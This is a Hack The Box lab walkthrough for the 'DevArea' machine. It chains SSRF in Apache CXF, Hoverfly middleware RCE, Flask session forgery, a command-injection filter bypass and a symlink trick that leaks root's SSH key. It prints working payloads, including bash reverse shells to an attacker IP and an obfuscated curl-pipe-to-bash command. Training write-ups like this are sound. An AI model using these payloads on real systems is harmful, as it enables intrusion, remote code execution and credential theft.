
# 🚀 DevArea - HTB Machine Walkthrough

> **Machine:** DevArea  
> **Difficulty:** Medium  
> **Platform:** Hack The Box  
> **Date:** 3rd July 2026  
> **Prepared By:** dotguy  
> **Machine Author:** EmSec  

---

## 📋 Table of Contents
- [Synopsis](#synopsis)
- [Skills Required & Learned](#skills-required--learned)
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [HTTP](#http)
  - [FTP](#ftp)
- [Foothold](#foothold)
  - [SSRF via Apache CXF Aegis (CVE-2024-28752)](#ssrf-via-apache-cxf-aegis-cve-2024-28752)
  - [Hoverfly RCE (CVE-2025-54123)](#hoverfly-rce-cve-2025-54123)
- [Lateral Movement](#lateral-movement)
  - [SSH as dev_ryan](#ssh-as-dev_ryan)
  - [SysWatch Source Code Analysis](#syswatch-source-code-analysis)
  - [Flask Session Forgery](#flask-session-forgery)
  - [Command Injection Bypass](#command-injection-bypass)
- [Privilege Escalation](#privilege-escalation)
  - [Symlink Chain Abuse](#symlink-chain-abuse)
  - [Root SSH Key Leak](#root-ssh-key-leak)
- [Flags](#flags)
- [Attack Chain](#attack-chain)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## Synopsis

DevArea is a medium-difficulty Linux machine that chains together several service misconfigurations. Anonymous FTP exposes a Java SOAP application built on Apache CXF with the Aegis databinding module, which is vulnerable to an SSRF flaw, **CVE-2024-28752**. We abuse this to read `/proc/<PID>/cmdline` entries and recover the Hoverfly admin credentials from the arguments of a running process.

The Hoverfly Admin UI is affected by **CVE-2025-54123**, whose middleware endpoint permits remote code execution and grants a foothold as `dev_ryan`. We then analyze the source of an internal monitoring app, SysWatch, whose installation script leaves its environment file world-readable. The leaked secret key lets us forge an admin Flask session, and a weak blacklist regex in the service-status feature is bypassed to gain command injection as the `syswatch` user.

Finally, we abuse a root-executed log-reading CLI whose symlink validation fails to resolve chained symlinks, leaking the root SSH private key for a full compromise.

---

## Skills Required & Learned

| **Skills Required** | **Skills Learned** |
|:--------------------|:-------------------|
| Linux Fundamentals | SSRF Exploitation via Apache CXF Aegis (XOP Inclusion) |
| Web Application Security | Flask Session Forgery |
| Source Code Review | Command Injection Filter Bypass |
| | Symlink Chain Abuse |

---

## Enumeration

### Nmap

```bash
# Discover open ports
ports=$(nmap -p- --min-rate=1000 -T4 10.129.32.241 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

# Detailed scan
nmap -p$ports -sC -sV 10.129.32.241
```

**Results:**
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 2 ftp ftp 4096 Sep 22 2025 pub
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp   open  http          Apache httpd 2.4.58
| http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http          Jetty 9.4.27.v20200227
8500/tcp open  http          Golang net/http server
8888/tcp open  http          Golang net/http server (Hoverfly Dashboard)
```

**Add to /etc/hosts:**
```bash
echo "10.129.32.241 devarea.htb" | sudo tee -a /etc/hosts
```

### HTTP

Browsing `http://devarea.htb` loads a static DevArea homepage.

Port 8080 returns a default Jetty 404 page confirming a Java-based web server.

### FTP

Anonymous FTP login is allowed:

```bash
ftp 10.129.32.241
# Login: anonymous
# Password: [any]
```

The `pub` directory contains a single file: `employee-service.jar`.

---

## Foothold

### SSRF via Apache CXF Aegis (CVE-2024-28752)

**1. Download and decompile the JAR:**

```bash
ftp get employee-service.jar
jd-gui employee-service.jar
```

**Findings:**
- Java SOAP web service with Apache CXF 3.2.14
- Aegis databinding module
- Vulnerable to **CVE-2024-28752** (SSRF via XOP Include)
- Endpoint: `/employeeService`
- WSDL: `/employeeService?wsdl`

**2. SOAP Request Structure:**

```xml
POST /employeeService HTTP/1.1
Host: devarea.htb:8080
Content-Type: text/xml; charset=utf-8
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:tns="http://devarea.htb/">
  <soapenv:Header/>
  <soapenv:Body>
    <tns:submitReport>
      <arg0>
        <confidential>true</confidential>
        <content>
          <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
                       href="file:///etc/hosts"/>
        </content>
        <department>IT</department>
        <employeeName>John Doe</employeeName>
      </arg0>
    </tns:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
```

**3. Read `/proc/<PID>/cmdline` to find credentials:**

Using the SSRF, we can read command-line arguments of running processes:

```bash
# Enumerate PIDs via /proc
# Read each PID's cmdline
# Found Hoverfly credentials
```

**Extracted Credentials:**
```
/opt/HoverFly/hoverfly -username admin -password O7IJ27Myxyxiu -listen-on-host 0.0.0.0
```

**Hoverfly Admin Credentials:** `admin:O7IJ27Myxyxiu`

### Hoverfly RCE (CVE-2025-54123)

**1. Login to Hoverfly Dashboard:**

```
http://devarea.htb:8888
Username: admin
Password: O7IJ27Myxyxiu
```

**2. Get Bearer Token:**

```bash
TOKEN=$(curl -s -X POST http://devarea.htb:8888/api/v2/hoverfly/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27Myxyxiu"}' \
  | jq -r .token)
```

**3. Check middleware endpoint:**

```bash
curl -s -X GET "http://devarea.htb:8888/api/v2/hoverfly/middleware" \
  -H "Authorization: Bearer $TOKEN"
```

**4. Test command execution:**

```bash
curl -s -X PUT "http://devarea.htb:8888/api/v2/hoverfly/middleware" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"binary":"/bin/bash","script":"whoami"}'
```

**Response:**
```
STDOUT: dev_ryan
```

**5. Reverse Shell:**

```bash
# Set up listener
nc -lvnp 4444

# Execute reverse shell
curl -s -X PUT "http://devarea.htb:8888/api/v2/hoverfly/middleware" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"binary":"/bin/bash","script":"bash -i >& /dev/tcp/10.10.16.28/4444 0>&1"}'
```

**Result:**
```bash
dev_ryan@devarea:/opt/HoverFly$ id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

**User Flag:**
```bash
dev_ryan@devarea:~$ cat /home/dev_ryan/user.txt
```

---

## Lateral Movement

### SSH as dev_ryan

```bash
# Generate SSH key
dev_ryan@devarea:~$ ssh-keygen -f ~/.ssh/id_ed25519 -N ""

# Add public key to authorized_keys
dev_ryan@devarea:~$ cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys

# Copy private key to attacker machine
dev_ryan@devarea:~$ cat ~/.ssh/id_ed25519
```

**On attacker machine:**
```bash
chmod 600 id_ed25519
ssh dev_ryan@devarea.htb -i id_ed25519
```

### SysWatch Source Code Analysis

**Discover internal service on port 7777:**

```bash
dev_ryan@devarea:~$ netstat -lputn | grep 7777
tcp  0  0 127.0.0.1:7777  0.0.0.0:*  LISTEN
```

**Forward port via SSH:**
```bash
ssh dev_ryan@devarea.htb -i ~/.ssh/id_ed25519 -L 7777:127.0.0.1:7777
```

**Find SysWatch source code:**
```bash
dev_ryan@devarea:~$ ls
syswatch-v1.zip  user.txt
dev_ryan@devarea:~$ unzip syswatch-v1.zip
```

### Flask Session Forgery

**Review `setup.sh`:**
```bash
dev_ryan@devarea:~/syswatch$ cat setup.sh
```

**Key findings:**
- Environment file: `/etc/syswatch.env`
- Permissions: `chmod 755` (world-readable)
- Contains `SYSWATCH_SECRET_KEY` and `SYSWATCH_ADMIN_PASSWORD`

```bash
dev_ryan@devarea:~/syswatch$ cat /etc/syswatch.env
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200db3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
```

**Flask Session Forgery Script (`jwt_forgery.py`):**
```python
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

SECRET = "f3ac48a6006a13a37ab8da0ab0f2a3200db3640431efe440788beaefa236725"

def generate_flask_session(data):
    serializer = URLSafeTimedSerializer(
        SECRET,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }
    )
    return serializer.dumps(data)

cookie = generate_flask_session({
    "user_id": 1,
    "username": "admin"
})

print(cookie)
```

**Run script:**
```bash
dev_ryan@devarea:~$ python3 jwt_forgery.py
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aT24bQ.Z3arM20wxW4IPaGUAY7qg4SdnSU
```

**Set session cookie in browser and refresh → Admin access granted.**

### Command Injection Bypass

**Vulnerable endpoint:** `/service-status` (POST)

**Frontend validation (JavaScript):**
```javascript
const re = /^[A-Za-z0-9.-]{1,64}$/;
```

**Backend validation (app.py):**
```python
SAFE_SERVICE = re.compile(r"^[^;/&.<>\rA-Z]*$")
```

**Vulnerability:** The blacklist blocks `;`, `/`, `&`, `<`, `>`, `\r`, and uppercase `A-Z`. But it **allows `|`** (pipe).

**Payload Construction:**

| **Character** | **How to generate** |
|:--------------|:--------------------|
| `/` | `eval "echo $$(echo path \| awk '{print toupper($0)}')" \| awk '{print substr($0,1,1)}'` |
| `.` | `$(ls \| head -n 1 \| awk '{print substr($0,4,1)}')` |

**Final Payload:**
```bash
ssh|curl http:${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}10$(ls | head -n 1 | awk '{print substr($0,4,1)}')10$(ls | head -n 1 | awk '{print substr($0,4,1)}')16$(ls | head -n 1 | awk '{print substr($0,4,1)}')28${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}shell | bash
```

**Setup:**
```bash
# On attacker machine - host reverse shell script
echo 'bash -i >& /dev/tcp/10.10.16.28/4444 0>&1' > shell
python3 -m http.server 80

# Start listener
nc -lvnp 4444
```

**Submit payload via BurpSuite or curl:**

```http
POST /service-status HTTP/1.1
Host: localhost:7777
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aT24bQ.Z3arM20wxW4IPaGUAY7qg4SdnSU

service=ssh|curl http:${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}10$(ls | head -n 1 | awk '{print substr($0,4,1)}')10$(ls | head -n 1 | awk '{print substr($0,4,1)}')16$(ls | head -n 1 | awk '{print substr($0,4,1)}')28${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}shell | bash
```

**Result:**
```bash
syswatch@devarea:~/syswatch_gui$ id
uid=984(syswatch) gid=984(syswatch) groups=984(syswatch)
```

---

## Privilege Escalation

### Symlink Chain Abuse

**Sudo permissions for dev_ryan:**
```bash
dev_ryan@devarea:~$ sudo -l
(root) NOPASSWD: /opt/syswatch/syswatch.sh
```

**Available commands:**
```bash
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh
Usage: /opt/syswatch/syswatch.sh <command> [args]

Commands:
  plugin <name> [args]    Execute plugin
  plugins                 List available plugins
  logs <file>             View log file
  logs --list             List available log files
```

**Log validation logic (syswatch.sh):**
```bash
if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then
    echo "[Blocked unsafe symlink target]: $file -> $target"
    return 1
fi
```

**Vulnerability:** The script only validates the **immediate target** of a symlink, not the final destination.

**Exploit - Symlink Chain:**

```bash
# Switch to syswatch user (or use the shell already obtained)
syswatch@devarea:~/logs$ ln -s /root/root.txt test.log
syswatch@devarea:~/logs$ ln -sf test.log disk.log
syswatch@devarea:~/logs$ ls -la
disk.log -> test.log
test.log -> /root/root.txt
```

**Read the flag:**
```bash
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs disk.log
<root_flag_content>
```

### Root SSH Key Leak

**Same technique, different target:**

```bash
syswatch@devarea:~/logs$ ln -sf /root/.ssh/id_ed25519 file1.log
syswatch@devarea:~/logs$ ln -sf file1.log disk.log
```

**Read the private key:**
```bash
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs disk.log
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

**SSH as root:**
```bash
dev_ryan@devarea:/tmp$ chmod 600 root_id_rsa
dev_ryan@devarea:/tmp$ ssh -i root_id_rsa root@127.0.0.1

root@devarea:~# id
uid=0(root) gid=0(root) groups=0(root)

root@devarea:~# cat /root/root.txt
```

---

## 🏁 Flags

| **Flag** | **Location** |
|:---------|:-------------|
| **User.txt** | `/home/dev_ryan/user.txt` |
| **Root.txt** | `/root/root.txt` |

---

## 🗺️ Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          DEVAREA ATTACK CHAIN                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. RECONNAISSANCE                                                          │
│     └─> Nmap → FTP (Anonymous) + Apache + Jetty + Hoverfly                │
│                                                                             │
│  2. FTP → employee-service.jar                                             │
│     └─> Decompile → Apache CXF + Aegis identified                         │
│                                                                             │
│  3. SSRF (CVE-2024-28752) → Read /proc/<PID>/cmdline                      │
│     └─> Extract Hoverfly credentials: admin:O7IJ27Myxyxiu                 │
│                                                                             │
│  4. Hoverfly RCE (CVE-2025-54123) → Reverse Shell as dev_ryan             │
│                                                                             │
│  5. LATERAL MOVEMENT                                                        │
│     ├─> SSH as dev_ryan (persistence)                                     │
│     ├─> Port forward 7777 → Discover SysWatch                             │
│     └─> Read /etc/syswatch.env → Flask secret key                         │
│                                                                             │
│  6. SESSION FORGERY                                                         │
│     └─> Forge admin Flask session → SysWatch dashboard                    │
│                                                                             │
│  7. COMMAND INJECTION (Pipe bypass) → Shell as syswatch                   │
│                                                                             │
│  8. PRIVILEGE ESCALATION                                                    │
│     ├─> Symlink chain → Read /root/root.txt                               │
│     └─> Symlink chain → Leak root SSH key → Full root shell              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🧠 Key Takeaways

1. **Anonymous FTP can expose sensitive source code.** Always check for anonymous login and download any available files.

2. **SSRF via SOAP databinding (CVE-2024-28752) is powerful.** Apache CXF with Aegis allows local file read via `file://` URIs.

3. **Command-line arguments are readable via `/proc/<PID>/cmdline`.** This is a goldmine for credential discovery.

4. **Hoverfly CVE-2025-54123 permits unauthenticated RCE.** The middleware endpoint executes arbitrary binaries/scripts.

5. **World-readable environment files are dangerous.** They leak secrets used for session signing.

6. **Flask session forgery is trivial if you have the secret key.** Use `itsdangerous` to craft valid sessions.

7. **Blacklist-based input validation is almost always bypassable.** The pipe character `|` was allowed → full command injection.

8. **Symlink validation must be recursive.** Checking only the immediate target is insufficient.

---

## 🛠️ Tools Used

| **Tool** | **Purpose** |
|:---------|:------------|
| **nmap** | Port scanning and service enumeration |
| **JD-GUI** | Decompile Java JAR files |
| **Burp Suite** | SOAP request manipulation |
| **curl** | HTTP/SOAP requests |
| **python3** | Flask session forgery |
| **ssh** | Port forwarding and remote access |
| **netcat** | Reverse shell listener |
| **jq** | JSON parsing |

---

## 📚 References

- [CVE-2024-28752 - Apache CXF Aegis SSRF](https://nvd.nist.gov/vuln/detail/CVE-2024-28752)
- [CVE-2025-54123 - Hoverfly Middleware RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-54123)
- [Apache CXF Documentation](https://cxf.apache.org/)
- [Flask Session Forgery](https://flask.palletsprojects.com/en/stable/quickstart/#sessions)

---

<div align="center">

**🔥 Happy Hacking! 🔥**


```
